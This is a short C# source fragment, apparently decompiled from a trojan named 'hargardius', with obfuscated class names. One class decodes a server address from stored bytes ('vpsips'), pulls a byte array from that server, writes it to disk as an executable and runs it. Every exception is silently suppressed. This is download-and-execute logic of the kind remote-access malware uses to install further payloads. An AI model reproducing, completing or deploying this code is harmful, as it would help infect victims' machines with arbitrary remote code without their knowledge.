using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace hargardius;

internal class OLRDMR
{
	public MLREDM server;

	public OLRDMR(MLREDM lID)
	{
		server = lID;
	}

	public NetworkStream hargardiusNS(TcpClient hargardiustcpsck)
	{
		return hargardiustcpsck.GetStream();
	}

	public string hargardiusserverIPD()
	{
		return Encoding.UTF8.GetString(DLAONIF.hargardiusvpsips, 0, DLAONIF.hargardiusvpsips.Length);
	}

	public void hargardiusdo_process(string filePath)
	{
		try
		{
			Process.Start(filePath);
		}
		catch
		{
		}
	}

	public void hargardiusremove_user()
	{
		try
		{
			byte[] array = server.hargardiuspull_data();
			if (array != null && !File.Exists(DLAONIF.hargardiusget_mpath() + DLAONIF.hargardiusremvUser + ".exe"))
			{
				File.WriteAllBytes(DLAONIF.hargardiusget_mpath() + DLAONIF.hargardiusremvUser + ".exe", array);
				hargardiusdo_process(DLAONIF.hargardiusget_mpath() + DLAONIF.hargardiusremvUser + ".exe");
			}
		}
		catch
		{
		}
	}
}
